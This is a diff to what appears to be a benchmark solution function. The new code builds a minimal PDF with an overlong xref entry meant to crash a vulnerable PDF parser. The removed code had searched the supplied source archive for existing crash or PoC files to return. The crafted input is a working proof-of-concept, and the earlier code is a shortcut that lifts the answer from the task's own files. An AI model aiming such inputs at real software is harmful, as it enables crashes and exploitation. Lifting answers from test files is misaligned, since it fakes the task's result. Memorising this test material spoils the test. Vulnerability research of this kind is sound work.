@@ -1,27 +1,19 @@
 import os
-import tarfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        try:
-            if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
-                with tarfile.open(src_path, 'r:*') as tf:
-                    candidates = []
-                    for m in tf.getmembers():
-                        if not m.isfile():
-                            continue
-                        name_lower = m.name.lower()
-                        if any(key in name_lower for key in ('42536536', 'poc', 'crash', 'testcase', 'repro')):
-                            candidates.append(m)
-                    for m in candidates:
-                        try:
-                            f = tf.extractfile(m)
-                            if f:
-                                data = f.read()
-                                if data:
-                                    return data
-                        except Exception:
-                            pass
-        except Exception:
-            pass
-        return b"xref\n0 2\n0000000000 00000 f1\n0000000000 00000 f2"
+        # Construct a minimal PDF that directs startxref to the beginning of an overlong xref entry.
+        # Overlong zeros in the first field should trigger the vulnerable read_xrefEntry path.
+        header = b"%PDF-1.3\n"
+        xref_offset = len(header)
+
+        # Overlong zeros for f1 (offset) and minimal f2 (generation)
+        f1_zeros = b"0" * 40  # sufficiently overlong to trigger the issue
+        f2_zeros = b"0" * 5   # standard gen, keep simple
+
+        xref = b"xref\n0 1\n" + f1_zeros + b" " + f2_zeros + b" n\n"
+        # Keep trailer minimal; not required for triggering but benign
+        trailer = b"trailer\n<<>>\n"
+        startxref = b"startxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n"
+
+        return header + xref + trailer + startxref
